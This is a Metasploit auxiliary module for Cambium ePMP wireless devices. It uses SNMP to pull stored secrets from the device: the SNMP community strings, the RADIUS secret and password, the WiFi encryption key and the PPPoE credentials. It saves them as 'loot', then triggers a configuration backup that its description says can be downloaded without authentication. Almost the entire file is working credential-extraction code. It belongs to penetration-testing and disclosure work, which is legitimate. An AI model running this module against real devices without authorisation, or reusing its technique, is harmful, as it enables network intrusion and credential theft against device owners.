##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Cambium ePMP SNMP Enumeration',
      'Description' => %q{
        Cambium devices (ePMP, PMP, Force, & others) can be administered using SNMP. The device configuration contains IP addresses, keys, and passwords, amongst other information. This module uses SNMP to extract Cambium ePMP device configuration. On certain software versions, specific device configuration values can be accessed using SNMP RO string, even though only SNMP RW string should be able to access them, according to MIB documentation. The module also triggers full configuration backup, and retrieves the backup url. The configuration file can then be downloaded without authentication. The module has been tested primarily on Cambium ePMP current version (3.2.x, as of today), PMP, and Force units.
      },
      'References' =>
        [
          ['URL', 'XXX']
        ],
      'Author' => ['Karn Ganeshen'],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        OptInt.new('TIMEOUT', [ true, "HTTP connection timeout", 10]),
      ])
  end

  def run_host(ip)
    begin
      snmp = connect_snmp

      epmp_info = ''

      # System Info
      snmpSystemName = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.3.0')
      snmpSystemDescription = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.4.0')
      cambiumSystemUptime = snmp.get_value('1.3.6.1.4.1.17713.21.1.1.4.0')
      cambiumUbootVersion = snmp.get_value('1.3.6.1.4.1.17713.21.1.1.14.0')

      epmp_info << "SNMP System Name: #{snmpSystemName}" << "\n"
      epmp_info << "SNMP System Description: #{snmpSystemDescription}" << "\n"
      epmp_info << "Device UpTime: #{cambiumSystemUptime}" << "\n"
      epmp_info << "U-boot version: #{cambiumUbootVersion}" << "\n"

      # SNMP Info
      snmpReadOnlyCommunity = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.1.0')
      snmpReadWriteCommunity = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.2.0')
      snmpTrapCommunity = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.6.0')
      snmpTrapEntryIP = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.7.1.2.0')

      epmp_info << "SNMP read-only community name: #{snmpReadOnlyCommunity}" << "\n"
      epmp_info << "SNMP read-write community name: #{snmpReadWriteCommunity}" << "\n"
      epmp_info << "SNMP Trap Community: #{snmpTrapCommunity}" << "\n"
      epmp_info << "SNMP Trap Server IP Address: #{snmpTrapEntryIP}" << "\n"

      # WIFI Radius Info
      wirelessRadiusServerInfo = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.5.5.0')
      wirelessRadiusServerPort = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.6.1.1.3.0')
      wirelessRadiusServerSecret = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.6.1.1.4.0')
      wirelessRadiusUsername = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.5.8.0')
      wirelessRadiusPassword = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.5.9.0')

      epmp_info << "RADIUS server info: #{wirelessRadiusServerInfo}" << "\n"
      epmp_info << "RADIUS server port: #{wirelessRadiusServerPort}" << "\n"
      epmp_info << "RADIUS server secret: #{wirelessRadiusServerSecret}" << "\n"
      epmp_info << "Wireless Radius Username: #{wirelessRadiusUsername}" << "\n"
      epmp_info << "Wireless Radius Password: #{wirelessRadiusPassword}" << "\n"

      # WIFI Info
      wirelessInterfaceSSID = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.2.2.0')
      wirelessInterfaceEncryptionKey = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.2.4.0')
      wirelessInterfaceEncryption = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.2.3.0')

      epmp_info << "Wireless Interface SSID: #{wirelessInterfaceSSID}" << "\n"
      epmp_info << "Wireless Interface Encryption Key: #{wirelessInterfaceEncryptionKey}" << "\n"
      epmp_info << "Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): #{wirelessInterfaceEncryption}" << "\n"

      # Network PPPoE config
      networkWanPPPoEService = snmp.get_value('1.3.6.1.4.1.17713.21.3.4.3.13.0')
      networkWanPPPoEUsername = snmp.get_value('1.3.6.1.4.1.17713.21.3.4.3.10.0')
      networkWanPPPoEPassword = snmp.get_value('1.3.6.1.4.1.17713.21.3.4.3.11.0')

      epmp_info << "Network PPPoE Service Name: #{networkWanPPPoEService}" << "\n"
      epmp_info << "Network PPPoE Username: #{networkWanPPPoEUsername}" << "\n"
      epmp_info << "Network PPPoE Password: #{networkWanPPPoEPassword}" << "\n"

      # Printing captured info
      print_status("Fetching System Information...\n")
      print_good("#{ip}")
      print_good("SNMP System Name: #{snmpSystemName}")
      print_good("SNMP System Description: #{snmpSystemDescription}")
      print_good("Device UpTime: #{cambiumSystemUptime}")
      print_good("U-boot version: #{cambiumUbootVersion} \n")

      print_status("Fetching SNMP Information...\n")
      print_good("SNMP read-only community name: #{snmpReadOnlyCommunity}")
      print_good("SNMP read-write community name: #{snmpReadWriteCommunity}")
      print_good("SNMP Trap Community: #{snmpTrapCommunity}")
      print_good("SNMP Trap Server IP Address: #{snmpTrapEntryIP} \n")

      print_status("Fetching WIFI Information...\n")
      print_good("Wireless Interface SSID: #{wirelessInterfaceSSID}")
      print_good("Wireless Interface Encryption Key: #{wirelessInterfaceEncryptionKey}")
      print_good("Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): #{wirelessInterfaceEncryption} \n")

      print_status("Fetching WIFI Radius Information...\n")
      print_good("RADIUS server info: #{wirelessRadiusServerInfo}")
      print_good("RADIUS server port: #{wirelessRadiusServerPort}")
      print_good("RADIUS server secret: #{wirelessRadiusServerSecret}")
      print_good("Wireless Radius Username: #{wirelessRadiusUsername}")
      print_good("Wireless Radius Password: #{wirelessRadiusPassword} \n")

      print_status("Fetching Network PPPoE Information...\n")
      print_good("Network PPPoE Service Name: #{networkWanPPPoEService}")
      print_good("Network PPPoE Username: #{networkWanPPPoEUsername}")
      print_good("Network PPPoE Password: #{networkWanPPPoEPassword} \n")

      # Woot we got loot.
      loot_name     = 'cambium_snmp'
      loot_type     = 'text/plain'
      loot_filename = 'cambium_snmp.txt'
      loot_desc     = 'Cambium ePMP configuration data'
      p = store_loot(loot_name, loot_type, datastore['RHOST'], epmp_info, loot_filename, loot_desc)
      print_good("Cambium ePMP loot saved at #{p}")

      # set request
      backup_oid = '1.3.6.1.4.1.17713.21.6.4.10.0'
      enable_backup = '1'
      varbind = SNMP::VarBind.new(backup_oid,SNMP::OctetString.new(enable_backup))
      snmp.set(varbind)
      backup_location_oid = '1.3.6.1.4.1.17713.21.6.4.13.0'
      backup_location = snmp.get_value(backup_location_oid)
      print_good("Configuration backed-up for direct download at: #{backup_location}")

    rescue SNMP::RequestTimeout
      print_error("#{ip} SNMP request timeout.")
    rescue Rex::ConnectionError
      print_error("#{ip} Connection refused.")
    rescue SNMP::InvalidIpAddress
      print_error("#{ip} Invalid IP Address. Check it with 'snmpwalk tool'.")
    rescue SNMP::UnsupportedVersion
      print_error("#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
      elog("Unknown error: #{e.class} #{e}")
      elog("Call stack:\n#{e.backtrace.join "\n"}")
    ensure
      disconnect_snmp
    end
  end
end
